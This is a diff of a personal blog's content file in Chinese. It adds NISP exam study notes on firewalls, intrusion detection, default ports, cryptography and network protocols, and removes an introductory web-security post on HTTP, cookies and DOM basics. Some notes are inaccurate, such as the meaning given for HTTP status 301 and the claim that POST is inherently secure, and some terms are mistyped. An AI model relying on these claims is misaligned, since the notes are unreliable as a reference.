+<h3 id="密码学的发展阶段——密码机（古典密码学）"><a href="#密码学的发展阶段——密码机（古典密码学）" class="headerlink" title="密码学的发展阶段——密码机（古典密码学）"></a>密码学的发展阶段——密码机（古典密码学）</h3><p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/nisp5.png" alt="nisp5"></p>
+<blockquote>
+<p>Enigma密码机属于古典密码学</p>
+</blockquote>
+<h3 id="防火墙的作用"><a href="#防火墙的作用" class="headerlink" title="防火墙的作用"></a>防火墙的作用</h3><p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/%E9%98%B2%E7%81%AB%E5%A2%99%E7%9A%84%E4%BD%9C%E7%94%A8.png" alt="防火墙的作用"></p>
+<blockquote>
+<p>防火墙保障的是内部网络数据的安全</p>
+<p>防火墙隔离两个不同安全要求的网络</p>
+<p>防火墙根据定义控制策略，检查并控制两个安全域之间的流量</p>
+<p>防火墙对进出网络边界的数据进行保护，防止恶意入侵，恶意代码的传播</p>
+</blockquote>
+<h3 id="入侵检测机制"><a href="#入侵检测机制" class="headerlink" title="入侵检测机制"></a>入侵检测机制</h3><p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/%E4%B8%BB%E6%9C%BA%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B%E7%B3%BB%E7%BB%9F.png" alt="主机入侵检测系统"></p>
+<blockquote>
+<p>主机入侵检测系统能供用于加密网络环境，可移植性差，开发、测试的压力比较大，能够监视所有系统</p>
+</blockquote>
+<h3 id="密码编码学和密码分析学"><a href="#密码编码学和密码分析学" class="headerlink" title="密码编码学和密码分析学"></a>密码编码学和密码分析学</h3><p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/%E5%AF%86%E7%A0%81%E7%BC%96%E7%A0%81%E5%AD%A6%E5%92%8C%E5%AF%86%E7%A0%81%E5%88%86%E6%9E%90%E5%AD%A6.png" alt="密码编码学和密码分析学"></p>
+<blockquote>
+<p>密码编码学：主要研究信息的编码，构建各种安全有效的密码算法和协议，用于信息的加密、认证等方面。</p>
+<p>密码分析学：主要研究破译密码获得消息，或对消息进行伪造。</p>
+</blockquote>
+<h3 id="涉密载体"><a href="#涉密载体" class="headerlink" title="涉密载体"></a>涉密载体</h3><p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/%E6%B6%89%E5%AF%86%E8%BD%BD%E4%BD%93.png" alt="涉密载体"></p>
+<blockquote>
+<p>涉密计算机禁止和外网连接</p>
+</blockquote>
+<h3 id="状态检测机制的缺点"><a href="#状态检测机制的缺点" class="headerlink" title="状态检测机制的缺点"></a>状态检测机制的缺点</h3><p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/%E7%8A%B6%E6%80%81%E6%A3%80%E6%B5%8B%E6%9C%BA%E5%88%B6.png" alt="状态检测机制"></p>
+<blockquote>
+<p>状态检测机制的缺点：检查内容比包过滤检测技术多，对防火墙的性能提出了更高要求；状态检测防火墙的配置非常复杂，对于用户的能力要求较高，使用起来不太方便。</p>
+</blockquote>
+<h3 id="信息安全目标"><a href="#信息安全目标" class="headerlink" title="信息安全目标"></a>信息安全目标</h3><p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/%E5%AF%86%E7%A0%81%E5%AD%A6%E4%BF%9D%E5%AF%86%E6%80%A7.png" alt="密码学保密性"></p>
+<blockquote>
+<p>保密性事确保信息被合法用户访问，而不呗泄露给非授权的用户、实体或过程，或供其利用的特性。</p>
+</blockquote>
+<h3 id="传输服务的默认端口"><a href="#传输服务的默认端口" class="headerlink" title="传输服务的默认端口"></a>传输服务的默认端口</h3><p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/ftp%E7%AB%AF%E5%8F%A321.png" alt="ftp端口21"></p>
+<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/POP3%E9%BB%98%E8%AE%A4%E7%AB%AF%E5%8F%A3.png" alt="POP3默认端口"></p>
+<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/DNS%E9%BB%98%E8%AE%A4%E7%AB%AF%E5%8F%A353.png" alt="DNS默认端口53"></p>
+<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/SMTP%E9%BB%98%E8%AE%A4%E7%AB%AF%E5%8F%A325.png" alt="SMTP默认端口25"></p>
+<blockquote>
+<p>FTP默认端口21</p>
+<p>SFTP默认端口22(SSH文件传输协议)</p>
+<p>POP3默认端口110</p>
+<p>DNS默认端口53</p>
+<p>SMTP默认端口25</p>
+<p>共享文件夹默认端口445</p>
+<p>远程桌面端口3389</p>
+<p>Telnet端口23</p>
+<p>HTTPS默认端口443</p>
+</blockquote>
+<h3 id="计算机网络的节点——转换节点和访问节点"><a href="#计算机网络的节点——转换节点和访问节点" class="headerlink" title="计算机网络的节点——转换节点和访问节点"></a>计算机网络的节点——转换节点和访问节点</h3><p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%9A%84%E8%8A%82%E7%82%B9.png" alt="计算机网络的节点"></p>
+<blockquote>
+<p>计算机网络的节点包括：转换节点和访问节点</p>
+</blockquote>
+<h3 id="物联网体系结构"><a href="#物联网体系结构" class="headerlink" title="物联网体系结构"></a>物联网体系结构</h3><p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/%E7%89%A9%E8%81%94%E7%BD%91%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84%E4%BD%9C%E7%94%A8.png" alt="物联网体系结构作用"></p>
+<blockquote>
+<p>物联网体系结构的作用：</p>
+<ul>
+<li>感知层：全面感知外界信息，本层主要设备是各种信息收集器</li>
+<li>传输层：主要用于把感知层收集的信息安全可靠地传输到信息支撑层，然后根据不同的应用需求进行信息处理。</li>
+<li>支撑层：对节点采集的信息处理，对信息进行分析和过滤，需要判断接受的信息是否真实有用，过滤掉垃圾升值恶意信息。</li>
+<li>应用层：具体的应用业务，所涉及的安全问题与业务特性相关，例如隐私保护、知识产权保护、取证、数据销毁等方面。</li>
+</ul>
+</blockquote>
+<h3 id="网络信息安全基本属性"><a href="#网络信息安全基本属性" class="headerlink" title="网络信息安全基本属性"></a>网络信息安全基本属性</h3><p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/%E6%95%B0%E6%8D%AE%E5%AE%8C%E6%95%B4%E6%80%A7.png" alt="数据完整性"></p>
+<blockquote>
+<ul>
+<li>完整性：保证信息系统中的数据处于完整的状态，确保信息没有遭受篡改和破坏。</li>
+<li>机密性：网络信息不泄露给非授权用户、实体或程序，能够防止非授权者获取信息。</li>
+<li>可用性：合法许可的用户能后及时获取网络信息或服务的特性。</li>
+<li>抗抵抗性：防止网络信息系统相关用户否认活动行为的特性。</li>
+<li>可控性：网络信息系统责任主体对其具有管理、支配能力的属性。</li>
+</ul>
+</blockquote>
+<h3 id="大数据的生命周期"><a href="#大数据的生命周期" class="headerlink" title="大数据的生命周期"></a>大数据的生命周期</h3><p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/%E5%A4%A7%E6%95%B0%E6%8D%AE%E7%9A%84%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F.png" alt="大数据的生命周期"></p>
+<blockquote>
+<p>大数据的生命周期：数据采集、数据存储、数据处理、数据分发、数据删除</p>
+</blockquote>
+<h3 id="七个任务、四项措施"><a href="#七个任务、四项措施" class="headerlink" title="七个任务、四项措施"></a>七个任务、四项措施</h3><p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/%E5%8A%A0%E5%BC%BA%E5%B7%A5%E4%B8%9A%E4%BA%92%E8%81%94%E7%BD%91%E5%AE%89%E5%85%A8%E5%B7%A5%E8%B5%84%E7%9A%84%E6%8C%87%E5%AF%BC%E6%84%8F%E8%A7%81.png" alt="加强工业互联网安全工资的指导意见"></p>
+<blockquote>
+<p>《意见》提出达成七个主要任务和四项保障措施</p>
+</blockquote>
+<h3 id="网络钓鱼攻击手段"><a href="#网络钓鱼攻击手段" class="headerlink" title="网络钓鱼攻击手段"></a>网络钓鱼攻击手段</h3><p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/%E7%BD%91%E7%BB%9C%E9%92%93%E9%B1%BC%E6%94%BB%E5%87%BB.png" alt="网络钓鱼攻击"></p>
+<blockquote>
+<ul>
+<li>网络钓鱼攻击手段：邮件地址欺骗、伪造网站页面、社会工程学</li>
+<li>主动防御技术：蜜罐技术。</li>
+</ul>
+</blockquote>
+<h3 id="可实现保密性的传输协议——SSL协议"><a href="#可实现保密性的传输协议——SSL协议" class="headerlink" title="可实现保密性的传输协议——SSL协议"></a>可实现保密性的传输协议——SSL协议</h3><p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/%E5%8D%8F%E8%AE%AE%E7%9A%84%E4%BF%9D%E5%AF%86%E6%80%A7.png" alt="协议的保密性"></p>
+<blockquote>
+<p>SSL协议中，使用握手协商加密和MAC算法以及保密密钥使用握手协议交换的数据进行加密和签名，使用报警协议定义数据传输过程中，出现问题如何去解决。<br>FTP协议、POP3协议、HTTP协议无法保证保密性。、</p>
+</blockquote>
+<h3 id="状态检测防火墙功能"><a href="#状态检测防火墙功能" class="headerlink" title="状态检测防火墙功能"></a>状态检测防火墙功能</h3><p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/%E7%8A%B6%E6%80%81%E6%A3%80%E6%B5%8B%E9%98%B2%E7%81%AB%E5%A2%99.png" alt="状态检测防火墙"></p>
+<blockquote>
+<p>状态检测防火墙又称动态包过滤防火墙，是对传统包过滤的功能拓展。</p>
+<p>状态检测防火墙实质上是包过滤，但它不仅对IP包头信息进行检查过滤，而且还要检查包的TCP头部信息甚至包的内容。</p>
+<p>状态检查防火墙允许规则的动态变化。</p>
+<p>状态防火墙通过采用状态监视器，对网络通信的各层（包括网络层、传输层以及应用层）实施检测，抽取其中部分数据，形成网络连接的动态状态信息。</p>
+</blockquote>
+<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/%E7%8A%B6%E6%80%81%E6%A3%80%E6%B5%8B%E9%98%B2%E7%81%AB%E5%A2%99%E7%9A%84%E4%BC%98%E7%82%B9.png" alt="状态检测防火墙的优点"></p>
+<h3 id="上网行为管理"><a href="#上网行为管理" class="headerlink" title="上网行为管理"></a>上网行为管理</h3><p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/%E4%B8%8A%E7%BD%91%E8%A1%8C%E4%B8%BA%E7%AE%A1%E7%90%86.png" alt="上网行为管理"></p>
+<blockquote>
+<p>上网行为管理目前可实现的功能：上网身份管控、互联网浏览管控、邮件外发管控、用户行为管控、上网应用管控。</p>
+</blockquote>
+<h3 id="IPV6-的地址空间——128位"><a href="#IPV6-的地址空间——128位" class="headerlink" title="IPV6 的地址空间——128位"></a>IPV6 的地址空间——128位</h3><p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/IPV6%E5%9C%B0%E5%9D%80%E7%A9%BA%E9%97%B4.png" alt="IPV6地址空间"></p>
+<blockquote>
+<p>IPV6是128位的地址空间，IPV4是32位地址空间</p>
+</blockquote>
+<h3 id="IPS-入侵防御系统-主要功能"><a href="#IPS-入侵防御系统-主要功能" class="headerlink" title="IPS(入侵防御系统)主要功能"></a>IPS(入侵防御系统)主要功能</h3><p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/%E5%85%A5%E4%BE%B5%E9%98%B2%E5%BE%A1%E7%B3%BB%E7%BB%9FIPS.png" alt="入侵防御系统IPS"></p>
+<blockquote>
+<p>IPS(入侵防御系统)主要功能：实时监视和拦截攻击；保护客户端；虚拟补丁。</p>
+</blockquote>
+<h3 id="VLAN之间数据传递的设备——路由器"><a href="#VLAN之间数据传递的设备——路由器" class="headerlink" title="VLAN之间数据传递的设备——路由器"></a>VLAN之间数据传递的设备——路由器</h3><p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/VLAN%E6%95%B0%E6%8D%AE%E4%BC%A0%E9%80%92%E8%AE%BE%E5%A4%87.png" alt="VLAN数据传递设备"></p>
+<blockquote>
+<p>能完成不同VLAN之间的数据传递的设备是路由器。路由器适用于不同网络之间。</p>
+</blockquote>
+<h3 id="系统对用户的身份单向鉴别"><a href="#系统对用户的身份单向鉴别" class="headerlink" title="系统对用户的身份单向鉴别"></a>系统对用户的身份单向鉴别</h3><p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/%E4%B8%AA%E4%BA%BA%E7%BD%91%E9%93%B6%E7%B3%BB%E7%BB%9F%E7%9A%84%E5%8D%95%E5%90%91%E9%89%B4%E5%88%AB.png" alt="个人网银系统的单向鉴别"></p>
+<blockquote>
+<p>账号、密码、和验证码成功登陆个人网银系统，系统对用户身份的的单向鉴别。</p>
+</blockquote>
+<h3 id="基于实体所知的鉴别威胁"><a href="#基于实体所知的鉴别威胁" class="headerlink" title="基于实体所知的鉴别威胁"></a>基于实体所知的鉴别威胁</h3><p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/%E5%9F%BA%E4%BA%8E%E5%AE%9E%E4%BD%93%E6%89%80%E7%9F%A5%E7%9A%84%E9%89%B4%E5%88%AB%E5%A8%81%E8%83%81.png" alt="基于实体所知的鉴别威胁"></p>
+<blockquote>
+<p>基于实体所知的鉴别威胁：暴力破解攻击，窃听攻击，重放攻击</p>
+</blockquote>
+<h3 id="证书管理器的调用"><a href="#证书管理器的调用" class="headerlink" title="证书管理器的调用"></a>证书管理器的调用</h3><p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/%E8%AF%81%E4%B9%A6%E7%AE%A1%E7%90%86%E5%99%A8%E7%9A%84%E8%B0%83%E7%94%A8.png" alt="证书管理器的调用"></p>
+<blockquote>
+<p>cmd打开certmgr.msc</p>
+</blockquote>
+<h3 id="IGMP协议"><a href="#IGMP协议" class="headerlink" title="IGMP协议"></a>IGMP协议</h3><p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/IGMP%E5%8D%8F%E8%AE%AE.png" alt="IGMP协议"></p>
+<blockquote>
+<p>IGMP协议：Internet组织管理协议 ，位于TCP&#x2F;IP协议的网络层</p>
+</blockquote>
+<h3 id="TCP网络安全协议"><a href="#TCP网络安全协议" class="headerlink" title="TCP网络安全协议"></a>TCP网络安全协议</h3><p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/TCP%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8D%8F%E8%AE%AE.png" alt="TCP网络安全协议"></p>
+<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/TCP%E5%8D%8F%E8%AE%AE%E6%89%80%E5%9C%A8%E5%B1%82.png" alt="TCP协议所在层"></p>
+<blockquote>
+<p>IPSec工作再网络层</p>
+<p>PP2P和L2TP工作在数据链路层</p>
+<p>SSL工作在传输层。</p>
+</blockquote>
+<h3 id="应用层协议"><a href="#应用层协议" class="headerlink" title="应用层协议"></a>应用层协议</h3><p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/%E5%BA%94%E7%94%A8%E5%B1%82%E5%8D%8F%E8%AE%AE.png" alt="应用层协议"></p>
+<blockquote>
+<p>应用层协议：HTTP协议，FTP协议，Telnet</p>
+<p>传输层协议：UDP协议，TCP协议</p>
+</blockquote>
+<h3 id="交换机的物理分层方式"><a href="#交换机的物理分层方式" class="headerlink" title="交换机的物理分层方式"></a>交换机的物理分层方式</h3><p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/%E4%BA%A4%E6%8D%A2%E6%9C%BA%E7%9A%84%E7%89%A9%E7%90%86%E5%88%86%E5%B1%82%E6%96%B9%E5%BC%8F.png" alt="交换机的物理分层方式"></p>
+<blockquote>
+<p>交换机的物理分层方式：接入层、汇聚层、核心层</p>
+</blockquote>
+<h3 id="网闸-物理隔离系统"><a href="#网闸-物理隔离系统" class="headerlink" title="网闸(物理隔离系统)"></a>网闸(物理隔离系统)</h3><p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/%E7%BD%91%E9%97%B8(%E7%89%A9%E7%90%86%E9%9A%94%E7%A6%BB%E7%B3%BB%E7%BB%9F).png" alt="网闸(物理隔离系统)"></p>
+<blockquote>
+<p>网闸（物理隔离网络）：外部处理单元+内部处理单元+冲裁处理单元</p>
+</blockquote>
+<h3 id="局域网中MAC-介质访问控制子层"><a href="#局域网中MAC-介质访问控制子层" class="headerlink" title="局域网中MAC(介质访问控制子层)"></a>局域网中MAC(介质访问控制子层)</h3><p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/%E5%B1%80%E5%9F%9F%E7%BD%91%E4%B8%ADMAC(%E4%BB%8B%E8%B4%A8%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6%E5%AD%90%E5%B1%82).png" alt="局域网中MAC(介质访问控制子层)"></p>
+<blockquote>
+<p>在局域网中，MAC指的是介质访问控制子层</p>
+</blockquote>
+<h3 id="无线局域网"><a href="#无线局域网" class="headerlink" title="无线局域网"></a>无线局域网</h3><p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/%E6%97%A0%E7%BA%BF%E5%B1%80%E5%9F%9F%E7%BD%91.png" alt="无线局域网"></p>
+<h3 id="网卡作用OSI七层的位置"><a href="#网卡作用OSI七层的位置" class="headerlink" title="网卡作用OSI七层的位置"></a>网卡作用OSI七层的位置</h3><p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/%E7%BD%91%E5%8D%A1%E4%BD%9C%E7%94%A8OSI%E4%B8%83%E5%B1%82%E7%9A%84%E4%BD%8D%E7%BD%AE.png" alt="网卡作用OSI七层的位置"></p>
+<h3 id="哈希函数"><a href="#哈希函数" class="headerlink" title="哈希函数"></a>哈希函数</h3><h3 id><a href="#" class="headerlink" title></a><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/%E5%93%88%E5%B8%8C%E5%87%BD%E6%95%B0.png" alt="哈希函数"></h3><blockquote>
+<p>哈希函数：单向散列函数，它可以将任意有限长度信息映射为固定长度的值</p>
+</blockquote>
+]]></content>
+      <tags>
+        <tag>笔记</tag>
+        <tag>nisp</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Python实战</title>
     <url>/2024/02/07/Python%E5%AE%9E%E6%88%98/</url>
     <content><![CDATA[<meta name="referrer" content="no-referrer">
@@ -1444,443 +1444,6 @@ over</p>
       <tags>
         <tag>Python</tag>
         <tag>实战项目</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Web_白帽子</title>
-    <url>/2024/01/25/Web-%E7%99%BD%E5%B8%BD%E5%AD%90/</url>
-    <content><![CDATA[<h2 id="Web基础介绍"><a href="#Web基础介绍" class="headerlink" title="Web基础介绍"></a>Web基础介绍</h2><blockquote>
-<p>知识点罗列：</p>
-<ul>
-<li>URL概念、结构格式</li>
-<li>HTTP报文结构</li>
-<li>cookie含义</li>
-<li>Set-cookie含义</li>
-<li>Referer的作用</li>
-<li>状态码301和302的含义</li>
-<li>Location的含义</li>
-</ul>
-</blockquote>
-<h3 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h3><blockquote>
-<p>统一资源定位符（Uniform Resource Locator）</p>
-</blockquote>
-<blockquote>
-<p>作用：定位服务器资源</p>
-</blockquote>
-<blockquote>
-<p>URL格式：schemna:&#x2F;&#x2F;host[:post#]&#x2F;path&#x2F;…&#x2F;[?query-string][#anchor]</p>
-<p>schemna	底层协议(例如：http,https,ftp…)</p>
-<p>host		  服务器的域名或IP地址</p>
-<p>:post 		服务器的端口，HTTP默认端口是80(可省略)，其他端口需要指明</p>
-<p>&#x2F;path&#x2F;…&#x2F;	访问资源的路径</p>
-<p>？query-string 发送给http服务器的数据</p>
-<p>[#anchor]	 锚</p>
-</blockquote>
-<h3 id="HTTP"><a href="#HTTP" class="headerlink" title="HTTP"></a>HTTP</h3><blockquote>
-<p>超文本传输协议（Hyper Text Transfer Protocol）</p>
-</blockquote>
-<blockquote>
-<p>作用：Web通信时使用的协议</p>
-</blockquote>
-<blockquote>
-<ol>
-<li><p>HTTP报文</p>
-<p>HTTP报文是用于HTTP协议交互的信息，HTTP报文本身是由多行数据构成的字符串文本。客户端的HTTP报文叫做请求报文，服务器端的HTTP报文叫做响应报文。</p>
-</li>
-<li><p>HTTP报文结构</p>
-<p><img lazyload src="/images/loading.svg" data-src="https://cdn.jsdelivr.net/gh/kingwempity/photo/images/http%E6%8A%A5%E6%96%87%E7%BB%93%E6%9E%84.png" alt="http报文结构"></p>
-<p><strong>报文首部</strong>是客户端或服务器端需处理的<code>请求或响应</code>的内容及属性， 可以传递额外的重要信息。报文首部包括请求行和请求头部。</p>
-<p>空行</p>
-<p><strong>报文主体</strong>主要包含应被发送的数据。通常，不一定有报文主体。</p>
-</li>
-<li><p>HTTP请求报文结构</p>
-<p><img lazyload src="/images/loading.svg" data-src="https://cdn.jsdelivr.net/gh/kingwempity/photo/images/http%E8%AF%B7%E6%B1%82%E6%8A%A5%E6%96%87%E7%BB%93%E6%9E%84.png" alt="HTTP请求报文结构"></p>
-<p>GET和POST的区别：</p>
-<blockquote>
-<p>（1）get是从服务器上获取数据（即下载），post是向服务器传送数据（即上传）。<br>（2）生成方式不同：<br>Get：URL输入；超连接；Form表单中method属性为get；Form表单中method为空。<br>Post只有一种：Form表单中method为Post。<br>（3）数据传送方式：Get传递的请求数据按照key-value的方式放在URL后面，在网址中可以直接看到，使用?分割URL和传输数据，传输的参数之间以&amp;相连，如：login.action?name&#x3D;user&amp;password&#x3D;123。所以安全性差。<br>POST方法会把请求的参数放到请求头部和空格下面的请求数据字段就是请求正文（请求体）中以&amp;分隔各个字段，请求行不包含参数，URL中不会额外附带参数。所以安全性高。<br>（3）发送数据大小的限制：通常GET请求可以用于获取轻量级的数据，而POST请求的内容数据量比较庞大些。<br>Get：1~2KB。get方法提交数据的大小直接影响到了URL的长度，但HTTP协议规范中其实是没有对URL限制长度的，限制URL长度的是客户端或服务器的支持的不同所影响。<br>Post：没有要求。post方式HTTP协议规范中也没有限定，起限制作用的是服务器的处理程序的能力。<br>（4）提交数据的安全：POST比GET方式的安全性要高。Get安全性差，Post安全性高。<br>通过GET提交数据，用户名和密码将明文出现在URL上，如果登录页面有浏览器缓存，或者其他人查看浏览器的历史记录，那么就可以拿到用户的账号和密码了。安全性将会很差。</p>
-</blockquote>
-</li>
-<li><p>HTTP响应报文结构</p>
-<p><img lazyload src="/images/loading.svg" data-src="https://cdn.jsdelivr.net/gh/kingwempity/photo/images/http%E5%93%8D%E5%BA%94%E6%8A%A5%E6%96%87%E7%BB%93%E6%9E%84.png" alt="HTTP响应报文结构"></p>
-</li>
-</ol>
-<hr>
-<p>版权声明：本文为博主原创文章，遵循 CC 4.0 BY-SA 版权协议，转载请附上原文出处链接和本声明。</p>
-<p>参考文章</p>
-<p>原文链接：<a class="link" href="https://blog.csdn.net/qq_35887546/article/details/104216286">https://blog.csdn.net/qq_35887546/article/details/104216286 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
-</blockquote>
-<blockquote>
-<p>HTTP请求的方式</p>
-<p>–GET</p>
-<p>–POST</p>
-<p>–HEAD				 与GET请求类似，不同在于与服务器只返回HTTP头部信息，没有页面内容</p>
-<p>–PUT					上传指定URL的描述</p>
-<p>–DELETE			 删除指定资源</p>
-<p>–OPTIONS 		 返回服务器支持的HTTP方法</p>
-</blockquote>
-<h3 id="cookie"><a href="#cookie" class="headerlink" title="cookie"></a>cookie</h3><blockquote>
-<p>cookie:相当于用户的凭证，类似与用户的通行证，很重要。</p>
-<p>set-cookie:服务器要求浏览器设置cookie</p>
-</blockquote>
-<h3 id="Referer"><a href="#Referer" class="headerlink" title="Referer"></a>Referer</h3><blockquote>
-<p>Referer的作用：</p>
-<p>–告知服务器该请求的来源（浏览器自动加上）</p>
-<p>–统计流量</p>
-<p>–判断来源合法性：防止盗链，防止CSRF漏洞</p>
-</blockquote>
-<h3 id="Location"><a href="#Location" class="headerlink" title="Location"></a>Location</h3><blockquote>
-<p>Location：跳转到地址</p>
-</blockquote>
-<h3 id="响应报文状态码"><a href="#响应报文状态码" class="headerlink" title="响应报文状态码"></a>响应报文状态码</h3><blockquote>
-<p>响应报文状态码</p>
-<p><strong>3</strong>：完成此请求必须进一步处理**</p>
-<p>301——删除请求数据</p>
-<p>302——在其他地址发现了请求数据</p>
-<hr>
-<p>详细状态码：<a class="link" href="https://blog.csdn.net/qq_35887546/article/details/104216807">https://blog.csdn.net/qq_35887546/article/details/104216807 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
-</blockquote>
-<h2 id="前端开发基础知识"><a href="#前端开发基础知识" class="headerlink" title="前端开发基础知识"></a>前端开发基础知识</h2><blockquote>
-<p>知识点罗列：</p>
-<p>​	–JavaScript</p>
-<p>​	–DOM</p>
-<p>​	–BOM</p>
-</blockquote>
-<h3 id="javaScript"><a href="#javaScript" class="headerlink" title="javaScript"></a>javaScript</h3><blockquote>
-<p>javaScript运行位置：</p>
-<ul>
-<li>HTML的<script></script></li>
-<li>HTML的事件属性中</li>
-<li>浏览器中的JavaScript控制台中的Console中</li>
-</ul>
-</blockquote>
-<h3 id="DOM"><a href="#DOM" class="headerlink" title="DOM"></a>DOM</h3><blockquote>
-<p>DOM本质：链接Web页面和编程语言</p>
-<p>JavaScript + DOM：访问和操作HTML文档的标准方法</p>
-</blockquote>
-<blockquote>
-<p>获取一个HTML元素内容</p>
-<ul>
-<li><p>tep1：获取元素</p>
-<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="title function_">getElementById</span>()<span class="comment">//获取元素</span></span><br></pre></td></tr></table></figure></div>
-</li>
-<li><p>tep2：获取元素的内容</p>
-<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line">.<span class="property">innerHTML</span><span class="comment">//获取元素的内容</span></span><br></pre></td></tr></table></figure></div>
-</li>
-<li><p>tep3：显示获取信息</p>
-<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="title function_">alert</span>(<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;id&quot;</span>).<span class="property">innerHTML</span>)</span><br></pre></td></tr></table></figure></div>
-</li>
-<li><p><strong>alert()方法在JavaScript中表示弹出一个警告框，可以用来展示信息</strong></p>
-</li>
-</ul>
-</blockquote>
-<p>示例</p>
-<blockquote>
-  <div class="highlight-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">title</span>&gt;</span>Kinwempity<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">P</span> <span class="attr">id</span>=<span class="string">&quot;intro&quot;</span>&gt;</span></span><br><span class="line">          Hello!敬请T期待</span><br><span class="line">       <span class="tag">&lt;/<span class="name">P</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">       x=<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;intro&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">       <span class="title function_">alert</span>(<span class="string">&#x27;id为intro元素的文本是：&#x27;</span>+x.<span class="property">innerHTML</span>);  </span></span><br><span class="line"><span class="language-javascript">       </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></div>
-</blockquote>
-<blockquote>
-<p>修改一个HTML元素</p>
-<ul>
-<li><p>tep1：获取元素</p>
-<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="title function_">getElementById</span>()</span><br></pre></td></tr></table></figure></div>
-</li>
-<li><p>tep2：获取元素内容</p>
-<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line">.<span class="property">innerHTML</span></span><br></pre></td></tr></table></figure></div></li>
-</ul>
-</blockquote>
-<p>示例</p>
-<blockquote>
